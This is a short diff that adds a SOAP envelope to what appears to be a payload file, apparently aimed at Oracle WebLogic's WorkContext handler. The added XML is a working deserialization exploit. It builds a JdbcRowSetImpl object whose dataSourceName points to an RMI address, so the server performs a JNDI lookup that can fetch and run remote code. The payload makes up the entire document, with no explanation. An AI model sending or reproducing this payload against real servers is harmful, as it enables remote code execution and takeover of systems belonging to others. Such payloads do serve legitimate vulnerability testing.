@@ -173,3 +173,20 @@
     </soapenv:Header>
     <soapenv:Body/>
 </soapenv:Envelope>
+
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+<soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <void class="com.sun.rowset.JdbcRowSetImpl">
+            <void property="dataSourceName">
+                <string>rmi://127.0.0.1:1999/Object</string>
+            </void>
+            <void property="autoCommit">
+                <boolean>true</boolean>
+            </void>
+        </void>
+    </work:WorkContext>
+</soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
